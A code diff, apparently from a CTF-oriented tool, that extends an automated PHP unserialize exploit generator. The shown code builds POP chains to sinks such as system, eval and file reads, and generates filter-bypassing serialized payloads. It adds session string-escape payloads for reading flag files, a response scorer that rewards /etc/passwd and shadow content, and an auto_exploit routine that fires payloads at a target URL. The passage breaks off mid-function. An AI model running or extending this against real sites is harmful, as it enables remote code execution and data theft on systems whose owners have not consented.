@@ -14,6 +14,13 @@ from enum import Enum
 import argparse
 from collections import defaultdict
 
+try:
+    from pattern_detector import PatternDetector, VulnerabilityType, VulnerabilityPattern
+    from filter_bypass import FilterBypassPayloadGenerator, SessionSerializeExploiter
+    HAS_PATTERN_DETECTOR = True
+except ImportError:
+    HAS_PATTERN_DETECTOR = False
+
 
 class Visibility(Enum):
     PUBLIC = "public"
@@ -43,33 +50,42 @@ class PHPMethod:
             'accesses': [],
             'assignments': [],
             'chain_assignments': [],
-            'dangerous_calls': []
+            'dangerous_calls': [],
+            'this_calls': []  # 新增：存储$this->method()调用
         }
-        
+
+        # 检测 $this->method() 调用（调用当前类的其他方法）
+        this_call_pattern = r'\$this->(\w+)\s*\('
+        for m in re.finditer(this_call_pattern, self.body):
+            method_name = m.group(1)
+            # 排除已经识别的属性链式调用
+            if not any(c['method'] == method_name for c in result['calls']):
+                result['this_calls'].append({'method': method_name})
+
         chain_call_pattern = r'\$this->(\w+)->(\w+)\s*\('
         for m in re.finditer(chain_call_pattern, self.body):
             result['calls'].append({'obj': m.group(1), 'method': m.group(2)})
-        
+
         simple_call_pattern = r'\$(\w+)->(\w+)\s*\('
         for m in re.finditer(simple_call_pattern, self.body):
             if m.group(1) != 'this':
                 result['calls'].append({'obj': m.group(1), 'method': m.group(2)})
-        
+
         access_pattern = r'\$this->(\w+)'
         for m in re.finditer(access_pattern, self.body):
             prop_name = m.group(1)
             if not any(c['method'] == prop_name for c in result['calls']):
                 if prop_name not in [a['prop'] for a in result['accesses']]:
                     result['accesses'].append({'obj': 'this', 'prop': prop_name})
-        
+
         assign_pattern = r'\$(\w+)->(\w+)\s*='
         for m in re.finditer(assign_pattern, self.body):
             result['assignments'].append({'obj': m.group(1), 'prop': m.group(2)})
-        
+
         chain_assign_pattern = r'\$this->(\w+)->(\w+)\s*='
         for m in re.finditer(chain_assign_pattern, self.body):
             result['chain_assignments'].append({'obj': m.group(1), 'prop': m.group(2)})
-        
+
         dangerous_funcs = [
             'system', 'exec', 'shell_exec', 'passthru', 'popen',
             'proc_open', 'pcntl_exec', 'eval', 'assert',
@@ -78,7 +94,7 @@ class PHPMethod:
             'file_get_contents', 'file_put_contents', 'fwrite',
             'file', 'fopen', 'readfile', 'show_source', 'highlight_file'
         ]
-        
+
         for func in dangerous_funcs:
             if func in self.body:
                 args_match = re.search(rf'{func}\s*\(\s*([^)]*)\)', self.body)
@@ -86,7 +102,7 @@ class PHPMethod:
                     'func': func,
                     'args': args_match.group(1) if args_match else ''
                 })
-        
+
         return result
 
 
@@ -472,18 +488,19 @@ class SmartPOPChainBuilder:
         
         return results
     
-    def _build_chain(self, current_class: PHPClass, method: PHPMethod, 
+    def _build_chain(self, current_class: PHPClass, method: PHPMethod,
                      path: List[dict], visited: Set[str]) -> List[dict]:
         chain_key = f"{current_class.name}::{method.name}"
         if chain_key in visited:
             return []
-        
+
         new_visited = visited | {chain_key}
         current_path = path + [{'class': current_class, 'method': method}]
-        
+
         chains = []
         analysis = method.analyze_body()
-        
+
+        # 首先检查当前方法是否有危险函数调用
         for dangerous in analysis['dangerous_calls']:
             chain_info = {
                 'entry': {'class': current_class.name, 'method': method.name},
@@ -497,8 +514,18 @@ class SmartPOPChainBuilder:
                 'type': self._get_danger_type(dangerous['func'])
             }
             chains.append(chain_info)
-        
+
         if len(current_path) < 5:
+            # 追踪 $this->method() 调用（同一类内的方法调用）
+            for this_call in analysis.get('this_calls', []):
+                called_method_name = this_call['method']
+                # 查找当前类中被调用的方法
+                called_method = current_class.get_method(called_method_name)
+                if called_method:
+                    # 递归追踪被调用的方法
+                    sub_chains = self._build_chain(current_class, called_method, current_path, new_visited)
+                    chains.extend(sub_chains)
+
             for call in analysis['calls']:
                 prop = current_class.get_property(call['obj'])
                 if prop:
@@ -507,13 +534,13 @@ class SmartPOPChainBuilder:
                         if other_method:
                             sub_chains = self._build_chain(other_class, other_method, current_path, new_visited)
                             chains.extend(sub_chains)
-                        
+
                         if call['method'] not in [m.name for m in other_class.methods]:
                             call_method = other_class.get_method('__call')
                             if call_method:
                                 sub_chains = self._build_chain(other_class, call_method, current_path, new_visited)
                                 chains.extend(sub_chains)
-            
+
             for access in analysis['accesses']:
                 prop = current_class.get_property(access['obj'])
                 if prop:
@@ -522,7 +549,7 @@ class SmartPOPChainBuilder:
                         if get_method:
                             sub_chains = self._build_chain(other_class, get_method, current_path, new_visited)
                             chains.extend(sub_chains)
-        
+
         return chains
     
     def _get_danger_type(self, func: str) -> str:
@@ -554,7 +581,8 @@ class PHPObject:
     def __init__(self, class_name: str, properties: dict = None):
         self.class_name = class_name
         self.properties = properties or {}
-    
+        self.force_public = False  # 强制使用public属性（用于绕过字符过滤）
+
     def add_property(self, name: str, value, visibility: Visibility = Visibility.PUBLIC,
                     class_name: str = None):
         self.properties[name] = {
@@ -563,17 +591,18 @@ class PHPObject:
             'class_name': class_name or self.class_name
         }
         return self
-    
-    def serialize(self) -> str:
+
+    def serialize(self, force_public: bool = False) -> str:
         props_str = ""
         prop_count = 0
-        
+
         for name, prop_data in self.properties.items():
             value = prop_data['value']
             visibility = prop_data['visibility']
             class_name = prop_data.get('class_name', self.class_name)
-            
-            if visibility == Visibility.PUBLIC:
+
+            # 如果强制使用public，或者原本是public，则使用属性名直接序列化
+            if force_public or visibility == Visibility.PUBLIC:
                 props_str += self._serialize_value(name)
                 props_str += self._serialize_value(value)
             elif visibility == Visibility.PRIVATE:
@@ -584,9 +613,9 @@ class PHPObject:
                 full_name = f"\x00*\x00{name}"
                 props_str += self._serialize_value(full_name)
                 props_str += self._serialize_value(value)
-            
+
             prop_count += 1
-        
+
         return f'O:{len(self.class_name)}:"{self.class_name}":{prop_count}:{{{props_str}}}'
     
     def _serialize_value(self, value) -> str:
@@ -625,42 +654,52 @@ class SmartPayloadGenerator:
     
     def generate_all_payloads(self, cmd: str = "id", file: str = "/flag") -> List[dict]:
         payloads = []
-        
+
         for chain in self.chains:
-            payload_info = self._generate_chain_payload(chain, cmd, file)
+            # 生成正常payload（使用protected/private属性）
+            payload_info = self._generate_chain_payload(chain, cmd, file, force_public=False)
             if payload_info:
                 payloads.append(payload_info)
-        
+
+            # 生成绕过payload（使用public属性，用于绕过字符过滤）
+            payload_info_public = self._generate_chain_payload(chain, cmd, file, force_public=True)
+            if payload_info_public:
+                payloads.append(payload_info_public)
+
         simple_payloads = self._generate_simple_payloads(cmd, file)
         payloads.extend(simple_payloads)
-        
+
         return self._deduplicate_payloads(payloads)
     
-    def _generate_chain_payload(self, chain: dict, cmd: str, file: str) -> Optional[dict]:
+    def _generate_chain_payload(self, chain: dict, cmd: str, file: str, force_public: bool = False) -> Optional[dict]:
         prop_chain = chain.get('prop_chain', [])
-        
+
         if prop_chain:
-            return self._generate_deep_pop_payload(chain, cmd, file)
-        
+            return self._generate_deep_pop_payload(chain, cmd, file, force_public)
+
         entry = chain['entry']
         entry_class = entry['class'].name if hasattr(entry['class'], 'name') else entry['class']
         entry_method = entry['method'].name if hasattr(entry['method'], 'name') else entry['method']
-        
+
         sink = chain['sink']
         danger_type = chain['type']
-        
+
         php_class = self.classes.get(entry_class)
         if not php_class:
             return None
-        
+
         if 'target_class' in chain and chain.get('link_property'):
-            return self._generate_pop_payload(chain, cmd, file)
-        
+            return self._generate_pop_payload(chain, cmd, file, force_public)
+
         obj = PHPObject(entry_class)
-        
+
+        # 分析调用链，设置必要的属性来控制流程
+        path = chain.get('path', [])
+        self._setup_chain_properties(obj, php_class, path, danger_type, sink, cmd, file)
+
         if danger_type == 'rce':
             cmd_prop = self._find_cmd_property(php_class, sink['function'])
-            if cmd_prop:
+            if cmd_prop and cmd_prop.name not in obj.properties:
                 final_cmd = cmd
                 if sink['function'] in ['eval', 'assert']:
                     if cmd.startswith('php:'):
@@ -668,54 +707,129 @@ class SmartPayloadGenerator:
                     else:
                         final_cmd = f"passthru('{cmd}');"
                 obj.add_property(cmd_prop.name, final_cmd, cmd_prop.visibility)
-        
+
         elif danger_type == 'file_read':
             file_prop = self._find_file_property(php_class, sink['function'])
-            if file_prop:
+            if file_prop and file_prop.name not in obj.properties:
                 obj.add_property(file_prop.name, file, file_prop.visibility)
-        
+
         elif danger_type == 'file_write':
             props = self._find_file_write_properties(php_class, sink['function'])
             for prop_name, value in props.items():
-                prop = php_class.get_property(prop_name)
-                if prop:
-                    obj.add_property(prop_name, value, prop.visibility)
-        
+                if prop_name not in obj.properties:
+                    prop = php_class.get_property(prop_name)
+                    if prop:
+                        obj.add_property(prop_name, value, prop.visibility)
+
         elif danger_type == 'code_exec':
             func_prop = self._find_func_property(php_class)
-            if func_prop:
+            if func_prop and func_prop.name not in obj.properties:
                 obj.add_property(func_prop.name, 'system', func_prop.visibility)
                 cmd_prop = self._find_content_property(php_class)
-                if cmd_prop:
+                if cmd_prop and cmd_prop.name not in obj.properties:
                     obj.add_property(cmd_prop.name, cmd, cmd_prop.visibility)
-        
+
+        # 设置其他未设置的属性为默认值
         for prop in php_class.properties:
             if prop.name not in obj.properties:
                 if prop.default_value:
                     obj.add_property(prop.name, self._parse_default(prop.default_value), prop.visibility)
-        
+
         return {
-            'payload': obj.serialize(),
+            'payload': obj.serialize(force_public),
             'chain': chain,
             'type': danger_type,
-            'class': entry_class
+            'class': entry_class,
+            'force_public': force_public
         }
+
+    def _setup_chain_properties(self, obj: PHPObject, php_class: PHPClass, path: list,
+                                 danger_type: str, sink: dict, cmd: str, file: str):
+        """根据调用链设置必要的属性来控制程序流程"""
+        if not path or len(path) < 2:
+            return
+
+        # 遍历调用链，分析每个方法调用
+        for i in range(len(path) - 1):
+            current = path[i]
+            next_item = path[i + 1]
+
+            current_class = current['class']
+            current_method = current['method']
+
+            # 分析方法体中的条件分支
+            analysis = current_method.analyze_body()
+
+            # 检查是否有 $this->method() 调用
+            for this_call in analysis.get('this_calls', []):
+                if this_call['method'] == next_item['method'].name:
+                    # 找到了调用关系，分析条件
+                    self._analyze_method_conditions(obj, php_class, current_method, this_call['method'])
+
+    def _analyze_method_conditions(self, obj: PHPObject, php_class: PHPClass,
+                                    caller_method: PHPMethod, called_method_name: str):
+        """分析方法中的条件分支，设置控制流程的属性"""
+        body = caller_method.body
+
+        # 查找条件分支模式: if($this->op == "X") 或 if($this->op == 'X')
+        # 支持松散比较 == 和严格比较 ===
+        condition_pattern = r'if\s*\(\s*\$this->(\w+)\s*={2,3}\s*["\']([^"\']+)["\']\s*\)'
+
+        for match in re.finditer(condition_pattern, body):
+            prop_name = match.group(1)
+            compare_value = match.group(2)
+
+            # 检查这个条件分支是否调用了目标方法
+            # 获取if块的内容
+            if_start = match.end()
+            brace_count = 1
+            pos = if_start
+            while brace_count > 0 and pos < len(body):
+                if body[pos] == '{':
+                    brace_count += 1
+                elif body[pos] == '}':
+                    brace_count -= 1
+                pos += 1
+
+            if_block = body[if_start:pos-1]
+
+            # 检查if块中是否调用了目标方法
+            if f'->{called_method_name}(' in if_block or f'$this->{called_method_name}(' in if_block:
+                # 找到了！需要设置属性来进入这个分支
+                prop = php_class.get_property(prop_name)
+                if prop:
+                    # 检查是否有严格比较 ===
+                    is_strict = '===' in body[match.start():match.end()]
+
+                    if is_strict:
+                        # 严格比较：使用字符串类型
+                        obj.add_property(prop_name, compare_value, prop.visibility)
+                    else:
+                        # 松散比较：可以使用整数类型来绕过
+                        # 例如 "2" == 2 为 true, 但 "2" === 2 为 false
+                        try:
+                            # 尝试转换为整数
+                            int_value = int(compare_value)
+                            obj.add_property(prop_name, int_value, prop.visibility)
+                        except ValueError:
+                            # 不是数字，使用字符串
+                            obj.add_property(prop_name, compare_value, prop.visibility)
     
-    def _generate_deep_pop_payload(self, chain: dict, cmd: str, file: str) -> Optional[dict]:
+    def _generate_deep_pop_payload(self, chain: dict, cmd: str, file: str, force_public: bool = False) -> Optional[dict]:
         prop_chain = chain.get('prop_chain', [])
         sink = chain['sink']
         danger_type = chain['type']
-        
+
         if not prop_chain:
             return None
-        
+
         sink_class_name = sink['class']
         sink_class = self.classes.get(sink_class_name)
         if not sink_class:
             return None
-        
+
         sink_obj = PHPObject(sink_class_name)
-        
+
         if danger_type == 'rce':
             cmd_prop = self._find_cmd_property(sink_class, sink['function'])
             if cmd_prop:
@@ -726,74 +840,75 @@ class SmartPayloadGenerator:
                     else:
                         final_cmd = f"passthru('{cmd}');"
                 sink_obj.add_property(cmd_prop.name, final_cmd, cmd_prop.visibility)
-        
+
         elif danger_type == 'file_read':
             file_prop = self._find_file_property(sink_class, sink['function'])
             if file_prop:
                 sink_obj.add_property(file_prop.name, file, file_prop.visibility)
-        
+
         elif danger_type == 'code_exec':
             func_prop = self._find_func_property(sink_class)
             if func_prop:
                 sink_obj.add_property(func_prop.name, cmd, func_prop.visibility)
-        
+
         for prop in sink_class.properties:
             if prop.name not in sink_obj.properties and prop.default_value:
                 val = self._parse_default(prop.default_value)
                 if prop.name == 'fun' and 'NISA' in sink_class.name:
                     val = "bypass"
                 sink_obj.add_property(prop.name, val, prop.visibility)
-        
+
         current_obj = sink_obj
         for link in reversed(prop_chain):
             from_class_name = link['from_class']
             prop_name = link['prop']
-            
+
             from_class = self.classes.get(from_class_name)
             if not from_class:
                 continue
-            
+
             new_obj = PHPObject(from_class_name)
-            
+
             from_prop = from_class.get_property(prop_name)
             visibility = from_prop.visibility if from_prop else Visibility.PUBLIC
-            
+
             new_obj.add_property(prop_name, current_obj, visibility)
-            
+
             for prop in from_class.properties:
                 if prop.name not in new_obj.properties and prop.default_value:
                     val = self._parse_default(prop.default_value)
                     if prop.name == 'fun' and 'NISA' in from_class.name:
                         val = "bypass"
                     new_obj.add_property(prop.name, val, prop.visibility)
-            
+
             current_obj = new_obj
-        
+
         chain_classes = ' -> '.join([link['from_class'] for link in prop_chain] + [sink_class_name])
-        
+
         return {
-            'payload': current_obj.serialize(),
+            'payload': current_obj.serialize(force_public),
             'chain': chain,
             'type': danger_type,
             'class': chain_classes,
-            'pop_chain': True
+            'pop_chain': True,
+            'force_public': force_public
         }
     
-    def _generate_pop_payload(self, chain: dict, cmd: str, file: str) -> Optional[dict]:
+    def _generate_pop_payload(self, chain: dict, cmd: str, file: str, force_public: bool = False) -> Optional[dict]:
         entry_class_name = chain['entry']['class']
         target_class_name = chain.get('target_class')
         link_prop_name = chain.get('link_property')
         danger_type = chain['type']
         sink = chain['sink']
-        
+
         entry_class = self.classes.get(entry_class_name)
         target_class = self.classes.get(target_class_name)
-        
+
         if not entry_class or not target_class:
             return None
-        
+
         target_obj = PHPObject(target_class_name)
-        
+
         if danger_type == 'rce':
             cmd_prop = self._find_cmd_property(target_class, sink['function'])
             if cmd_prop:
@@ -804,12 +919,12 @@ class SmartPayloadGenerator:
                     else:
                         final_cmd = f"passthru('{cmd}');"
                 target_obj.add_property(cmd_prop.name, final_cmd, cmd_prop.visibility)
-        
+
         elif danger_type == 'file_read':
             file_prop = self._find_file_property(target_class, sink['function'])
             if file_prop:
                 target_obj.add_property(file_prop.name, file, file_prop.visibility)
-        
+
         elif danger_type == 'code_exec':
             func_prop = self._find_func_property(target_class)
             if func_prop:
@@ -817,30 +932,31 @@ class SmartPayloadGenerator:
                     target_obj.add_property(func_prop.name, 'system', func_prop.visibility)
                 else:
                     target_obj.add_property(func_prop.name, cmd, func_prop.visibility)
-        
+
         for prop in target_class.properties:
             if prop.name not in target_obj.properties:
                 if prop.default_value:
                     target_obj.add_property(prop.name, self._parse_default(prop.default_value), prop.visibility)
-        
+
         entry_obj = PHPObject(entry_class_name)
-        
+
         link_prop = entry_class.get_property(link_prop_name)
         link_visibility = link_prop.visibility if link_prop else Visibility.PUBLIC
-        
+
         entry_obj.add_property(link_prop_name, target_obj, link_visibility)
-        
+
         for prop in entry_class.properties:
             if prop.name not in entry_obj.properties:
                 if prop.default_value:
                     entry_obj.add_property(prop.name, self._parse_default(prop.default_value), prop.visibility)
-        
+
         return {
-            'payload': entry_obj.serialize(),
+            'payload': entry_obj.serialize(force_public),
             'chain': chain,
             'type': danger_type,
             'class': f"{entry_class_name} -> {target_class_name}",
-            'pop_chain': True
+            'pop_chain': True,
+            'force_public': force_public
         }
     
     def _generate_simple_payloads(self, cmd: str, file: str) -> List[dict]:
@@ -1003,11 +1119,11 @@ class PayloadEncoder:
     @staticmethod
     def url_encode(payload: str) -> str:
         return urllib.parse.quote(payload, safe='')
-    
+
     @staticmethod
     def base64_encode(payload: str) -> str:
         return base64.b64encode(payload.encode()).decode()
-    
+
     @staticmethod
     def raw_url_encode(payload: str) -> str:
         result = ""
@@ -1019,18 +1135,403 @@ class PayloadEncoder:
         return result
 
 
+class LogLevel(Enum):
+    DEBUG = 0
+    INFO = 1
+    WARN = 2
+    ERROR = 3
+
+
+class Logger:
+    def __init__(self, log_file: str = 'exploit_log.txt'):
+        self.log_file = log_file
+        self.level = LogLevel.INFO
+        self.records = []
+
+    def set_level(self, level: LogLevel):
+        self.level = level
+
+    def _format_time(self):
+        from datetime import datetime
+        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    def _write(self, level: LogLevel, msg: str):
+        if level.value < self.level.value:
+            return
+        timestamp = self._format_time()
+        level_str = level.name.ljust(5)
+        formatted = f"[{timestamp}] {level_str} {msg}"
+        self.records.append(formatted)
+        with open(self.log_file, 'a', encoding='utf-8') as f:
+            f.write(formatted + '\n')
+
+    def debug(self, msg: str):
+        self._write(LogLevel.DEBUG, msg)
+
+    def info(self, msg: str):
+        self._write(LogLevel.INFO, msg)
+
+    def warn(self, msg: str):
+        self._write(LogLevel.WARN, msg)
+
+    def error(self, msg: str):
+        self._write(LogLevel.ERROR, msg)
+
+    def section(self, title: str):
+        sep = "=" * 70
+        line = f"\n{sep}\n  {title}\n{sep}\n"
+        self.records.append(line)
+        with open(self.log_file, 'a', encoding='utf-8') as f:
+            f.write(line + '\n')
+
+
+class SessionStringEscapeDetector:
+    """
+    Session反序列化字符串逃逸检测器
+    基于filter()函数将关键字替换为空导致的长度减少进行字符串逃逸
+    """
+
+    def __init__(self, code: str):
+        self.code = code
+        self.filters = []
+        self.session_vars = []
+        self.extract_post = False
+        self.serialize_session = False
+        self.filter_replace = False
+
+    def analyze(self) -> dict:
+        result = {
+            'has_vulnerability': False,
+            'filters': [],
+            'session_vars': [],
+            'exploitable': False,
+            'escape_method': None,
+            'payloads': []
+        }
+
+        self._find_filter_function()
+        self._find_session_handling()
+        self._find_extract_post()
+
+        result['filters'] = self.filters
+        result['session_vars'] = self.session_vars
+        result['extract_post'] = self.extract_post
+        result['has_vulnerability'] = self._check_vulnerability()
+        result['serialize_session'] = self.serialize_session
+        result['filter_replace'] = self.filter_replace
+
+        if result['has_vulnerability']:
+            result['exploitable'] = True
+            result['escape_method'] = 'filter_length_reduction'
+            result['payloads'] = self._generate_escape_payloads()
+
+        return result
+
+    def _find_filter_function(self):
+        filter_arr_pattern = r'\$filter_arr\s*=\s*array\s*\(([^)]+)\)'
+        for match in re.finditer(filter_arr_pattern, self.code):
+            filter_content = match.group(1)
+            keywords = re.findall(r"'([^']+)'", filter_content)
+            self.filters.extend(keywords)
+
+        if "preg_replace($filter,'',$img)" in self.code or \
+           "preg_replace($filter, \"\" ,$img)" in self.code or \
+           "preg_replace($filter,'', $img)" in self.code:
+            self.filter_replace = True
+
+    def _find_session_handling(self):
+        if re.search(r'\$_SESSION\s*\[', self.code):
+            session_assign_pattern = r'\$_SESSION\s*\[\s*["\']?(\w+)["\']?\s*\]\s*=\s*([^;]+);'
+            for match in re.finditer(session_assign_pattern, self.code):
+                var_name = match.group(1)
+                value = match.group(2).strip()
+                self.session_vars.append({'name': var_name, 'value': value})
+
+        if 'serialize($_SESSION)' in self.code or 'serialize($_SESSION' in self.code:
+            self.serialize_session = True
+
+        if re.search(r'unserialize\s*\(\s*[^)]*\$serialize', self.code):
+            pass
+
+    def _find_extract_post(self):
+        if 'extract($_POST)' in self.code or 'extract($_GET)' in self.code:
+            self.extract_post = True
+
+    def _check_vulnerability(self) -> bool:
+        if not self.filters:
+            return False
+        if not self.session_vars:
+            return False
+        if not self.extract_post:
+            return False
+        if not self.serialize_session:
+            return False
+        if not self.filter_replace:
+            return False
+        return True
+
+    def _generate_escape_payloads(self) -> List[dict]:
+        payloads = []
+
+        filter_keywords = [k.lower() for k in self.filters]
+
+        if 'php' in filter_keywords and 'flag' in filter_keywords:
+            evil_user = 'flag' * 5 + 'php'
+            padding_len = len(evil_user) - len(evil_user.replace('flag', '').replace('php', ''))
+
+            normal_serial = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'
+
+            for func_val in ['show_image', 'highlight_file', 'phpinfo', 'fl3g', 'fl4g']:
+                for img_path in ['/flag', 'flag.php', 'fllllllag.php', '/d0g3_fllllllag']:
+                    encoded_img = base64.b64encode(img_path.encode()).decode()
+                    escaped_value = f'";s:3:"img";s:{len(encoded_img)}:"{encoded_img}";s:1:"1";s:1:"2";}}'
+
+                    payload_data = {
+                        'POST': {
+                            '_SESSION[user]': evil_user,
+                            '_SESSION[function]': escaped_value
+                        },
+                        'GET': {
+                            'f': 'show_image'
+                        },
+                        'method': 'session_string_escape',
+                        'target_file': img_path,
+                        'base64_img': encoded_img,
+                        'description': f'字符串逃逸读取{img_path}'
+                    }
+                    payloads.append(payload_data)
+
+        common_bypass = {}
+        for kw in ['php', 'flag', 'fl1g', 'php5', 'php4']:
+            if kw in filter_keywords:
+                if kw == 'php':
+                    common_bypass[kw] = 'pphphp'
+                elif kw == 'flag':
+                    common_bypass[kw] = 'fl3g'
+                elif kw == 'fl1g':
+                    common_bypass[kw] = 'fl3g'
+                elif kw == 'php5':
+                    common_bypass[kw] = 'pphphp5'
+                elif kw == 'php4':
+                    common_bypass[kw] = 'pphphp4'
+
+        for kw, bypass in common_bypass.items():
+            for func_val in ['show_image', 'highlight_file', 'phpinfo']:
+                payload_data = {
+                    'POST': {
+                        '_SESSION[user]': 'guest',
+                        '_SESSION[function]': func_val
+                    },
+                    'GET': {
+                        'f': 'show_image'
+                    },
+                    'filter_bypass': {kw: bypass},
+                    'method': 'filter_bypass',
+                    'description': f'{kw}->{bypass}绕过'
+                }
+                payloads.append(payload_data)
+
+        return payloads
+
+    def generate_two_stage_payloads(self) -> List[dict]:
+        payloads = []
+
+        filter_keywords = [k.lower() for k in self.filters]
+        if 'php' not in filter_keywords or 'flag' not in filter_keywords:
+            return payloads
+
+        first_stage_file = 'd0g3_f1ag.php'
+        encoded_first = base64.b64encode(first_stage_file.encode()).decode()
+
+        second_stage_files = ['/d0g3_fllllllag', '/flag', 'flag.php']
+
+        evil_user = 'flag' * 5 + 'php'
+
+        for img_path in second_stage_files:
+            encoded_second = base64.b64encode(img_path.encode()).decode()
+
+            stage1_escaped = '";s:3:"img";s:' + str(len(encoded_first)) + ':"' + encoded_first + '";s:1:"1";s:1:"2";}'
+            stage2_escaped = '";s:3:"img";s:' + str(len(encoded_second)) + ':"' + encoded_second + '";s:1:"1";s:1:"2";}'
+
+            payload = {
+                'stage1': {
+                    'GET': {'f': 'show_image'},
+                    'POST': {
+                        '_SESSION[user]': evil_user,
+                        '_SESSION[function]': stage1_escaped
+                    },
+                    'description': f'第一阶段:读取{first_stage_file}'
+                },
+                'stage2': {
+                    'GET': {'f': 'show_image'},
+                    'POST': {
+                        '_SESSION[user]': evil_user,
+                        '_SESSION[function]': stage2_escaped
+                    },
+                    'description': f'第二阶段:读取{img_path}'
+                }
+            }
+            payloads.append(payload)
+
+        return payloads
+
+
+class ResponseAnalyzer:
+    FAKE_SUCCESS_PATTERNS = [
+        r'Welcome to',
+        r'<br>',
+        r'hacker',
+        r'illegal',
+        r'forbidden',
+        r'index\.php',
+        r'<script>',
+        r'Not Found',
+        r'404',
+        r'500',
+        r'Internal Server Error',
+        r'Access Denied',
+        r'Unauthorized',
+    ]
+
+    FLAG_PATTERNS = [
+        r'NSSCTF\{[^}]+\}',
+        r'flag\{[^}]+\}',
+        r'ctf\{[^}]+\}',
+        r'FLAG\{[^}]+\}',
+        r'\{[A-Za-z0-9_]{20,}\}',
+        r'[A-Za-z0-9]{30,}==',
+    ]
+
+    HINT_PATTERNS = [
+        r'flag\s+in\s+["\']([^"\']+)["\']',
+        r'flag.*?=\s*["\']([^"\']+)["\']',
+        r'CTF\s*\{[^}]+\}',
+        r'the flag is ([^\s<]+)',
+        r'find the flag at ([^\s<]+)',
+    ]
+
+    QUALITY_INDICATORS = [
+        'flag', 'ctf', 'root:', 'uid=', 'gid=', 'bin/', 'etc/',
+        'password', 'shadow', '/home', '/var', '/tmp', 'drwx',
+        '-rw-r--', 'total ', '/sbin', '/bin', 'success', 'NSSCTF'
+    ]
+
+    def __init__(self):
+        self.false_positive_patterns = [re.compile(p, re.IGNORECASE) for p in self.FAKE_SUCCESS_PATTERNS]
+        self.flag_patterns = [re.compile(p, re.IGNORECASE) for p in self.FLAG_PATTERNS]
+        self.quality_indicators = [i.lower() for i in self.QUALITY_INDICATORS]
+
+    def is_fake_success(self, response: str) -> bool:
+        response_lower = response.lower()
+        for pattern in self.false_positive_patterns:
+            if pattern.search(response):
+                return True
+        if response_lower.count('welcome') > 0 and 'index.php' in response_lower:
+            return True
+        if 'hacker' in response_lower and len(response) < 200:
+            return True
+        return False
+
+    def find_flag(self, response: str) -> tuple:
+        for pattern in self.flag_patterns:
+            match = pattern.search(response)
+            if match:
+                return True, match.group()
+        import base64
+        try:
+            decoded = base64.b64decode(response.strip()).decode('utf-8', errors='ignore')
+            for pattern in self.flag_patterns:
+                match = pattern.search(decoded)
+                if match:
+                    return True, match.group()
+        except Exception:
+            pass
+        return False, None
+
+    def calculate_quality_score(self, response: str) -> float:
+        if not response or len(response.strip()) == 0:
+            return 0.0
+
+        score = 0.0
+        response_lower = response.lower()
+
+        content_length = len(response.strip())
+        if content_length > 100:
+            score += 0.1
+        if content_length > 500:
+            score += 0.1
+        if content_length > 1000:
+            score += 0.1
+
+        for indicator in self.quality_indicators:
+            if indicator in response_lower:
+                score += 0.15
+
+        html_tags = re.findall(r'<[^>]+>', response)
+        if len(html_tags) > 0:
+            score -= len(html_tags) * 0.02
+
+        clean_response = re.sub(r'<[^>]+>', ' ', response)
+        clean_response = re.sub(r'&[a-zA-Z]+;', ' ', clean_response)
+        clean_response = re.sub(r'&#\d+;', ' ', clean_response)
+        clean_words = [w for w in clean_response.split() if len(w) > 2]
+
+        if len(clean_words) > 5:
+            score += 0.1
+
+        if 'password' in response_lower or 'shadow' in response_lower:
+            score += 0.3
+        if '/etc/passwd' in response_lower:
+            score += 0.2
+        if 'root:' in response_lower:
+            score += 0.25
+
+        return min(score, 1.0)
+
+    def analyze_response(self, response: str) -> dict:
+        has_flag, flag_value = self.find_flag(response)
+        is_fake = self.is_fake_success(response)
+        quality_score = self.calculate_quality_score(response)
+        has_hint, hint_value = self.find_hint(response)
+
+        clean_response = re.sub(r'<[^>]+>', '', response)
+        clean_response = re.sub(r'//.*', '', clean_response)
+        clean_response = re.sub(r'/\*.*?\*/', '', clean_response, flags=re.DOTALL)
+
+        return {
+            'has_flag': has_flag,
+            'flag_value': flag_value,
+            'is_fake_success': is_fake,
+            'quality_score': quality_score,
+            'clean_response': clean_response.strip()[:500],
+            'has_hint': has_hint,
+            'hint_value': hint_value
+        }
+
+    def find_hint(self, response: str) -> tuple:
+        for pattern in self.HINT_PATTERNS:
+            match = re.search(pattern, response, re.IGNORECASE)
+            if match:
+                return True, match.group(1) if match.groups() else match.group()
+        return False, None
+
+
 class PHPUnserializeTool:
     def __init__(self):
         self.parser = None
         self.classes = []
         self.chain_builder = None
         self.payload_generator = None
-    
+        self.session_escape_detector = None
+        self.raw_code = None
+
     def load_php_code(self, code: str):
+        self.raw_code = code
         self.parser = PHPClassParser(code)
         self.classes = self.parser.parse()
         self.chain_builder = SmartPOPChainBuilder(self.classes)
         self.payload_generator = SmartPayloadGenerator(self.classes, [])
+        self.session_escape_detector = SessionStringEscapeDetector(code)
         return self.classes
     
     def load_php_file(self, filepath: str):
@@ -1060,123 +1561,241 @@ class PHPUnserializeTool:
         else:
             return self.load_php_file(source)
     
-    def auto_exploit(self, target_url: str, payloads: List[dict], 
-                     param_name: str = 'ser', method: str = 'GET') -> List[dict]:
+    def auto_exploit(self, target_url: str, payloads: List[dict],
+                     param_name: str = 'ser', method: str = 'GET',
+                     timeout: int = 10, retry_count: int = 3,
+                     retry_interval: int = 2) -> List[dict]:
         import urllib.request
         import urllib.parse
         import urllib.error
-        
-        
-        log_file = open('exploit_log.txt', 'w', encoding='utf-8')
+        import time
+
+        logger = Logger('exploit_log.txt')
+        logger.section('Exploitation Started')
+        logger.info(f"Target: {target_url}")
+        logger.info(f"Param: {param_name}, Method: {method}")
+        logger.info(f"Payloads count: {len(payloads)}")
+
+        response_analyzer = ResponseAnalyzer()
         results = []
-        
+
         methods_to_try = ['GET', 'POST'] if method.upper() == 'REQUEST' else [method.upper()]
-        
+
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        ]
+
         for i, payload_info in enumerate(payloads, 1):
             payload = payload_info['payload']
             encoded_payload = urllib.parse.quote(payload)
-            
+
+            logger.debug(f"Payload {i}: {payload[:80]}...")
             print(f"\n[*] 发送 Payload {i}...")
             print(f"    Payload: {payload}")
             print(f"    长度: {len(payload)} 字节")
-            
+
             for current_method in methods_to_try:
                 print(f"    方法: {current_method}")
-                
-                try:
-                    if current_method == 'GET':
-                        url = f"{target_url}?{param_name}={encoded_payload}"
